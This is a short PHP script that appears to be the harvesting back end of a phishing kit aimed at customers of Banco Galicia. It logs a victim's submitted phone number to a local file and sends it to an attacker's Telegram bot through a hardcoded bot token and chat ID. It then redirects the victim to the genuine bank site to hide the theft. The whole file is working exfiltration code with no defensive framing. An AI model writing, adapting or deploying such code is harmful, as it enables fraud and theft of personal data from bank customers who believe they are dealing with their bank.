<?php
session_start();

$tel = $_POST['tel'];


$fp = fopen("logins.txt", "a+");
fwrite($fp, "\n");
fwrite($fp, "

TELEFONE: $tel");

fwrite($fp, "\n");
fwrite($fp, "");
fwrite($fp, "\n");

fclose($fp);
 $mensage =
        "------------ DADOS ------------\n
		TELEFONE: $tel
            ------------ by: shellby -------------
            ";
    
    $encoded = urlencode($mensage);
    
    $telegramBotApiKey = "5411768448:AAFDGUrMrNlE3Zoz4PVq58UiXZPQs-NuQb4"; //ID/TOKEN BOT AQUI
    $telegramChatID = "5551663715"; //ID CHAT/Canal
    
    $url3 = "https://api.telegram.org/bot{$telegramBotApiKey}/sendMessage?chat_id={$telegramChatID}&text={$encoded}";
    
    $opts = array('http' =>
        array(
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
        )
    );
    $context  = stream_context_create($opts);
    $result = file_get_contents($url3, false, $context);

header('Location: https://www.galicia.ar/personas');

?>